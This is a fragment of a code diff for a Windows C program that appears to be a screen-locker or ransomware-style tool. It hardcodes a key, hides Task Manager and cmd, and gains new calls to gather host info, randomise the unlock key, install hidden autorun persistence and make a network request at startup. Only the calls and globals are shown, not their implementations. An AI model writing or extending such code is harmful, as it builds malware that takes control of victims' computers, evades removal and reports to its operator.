@@ -16,10 +16,13 @@ HWND WSG=NULL;
 int screen_width=0;
 int screen_height=0;
 
+char ID[8];
+char hostname[50];
 char miYaoRoot[8]="qwe123";
 char miYao[8];
 int isLook=1;
 int isWrong=0;
+
 
 // 隐藏任务管理器窗口/cmd
 void KillTaskmgr()
@@ -49,6 +52,11 @@ void KillTaskmgr()
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
+    GetInfo();
+    RandomMiYao();
+    AutoRunAndHide(); 
+    MakeRequest();  
+    
     // 创建主窗口
     WNDCLASS wc = { 0 };
     wc.lpfnWndProc = WindowProc;
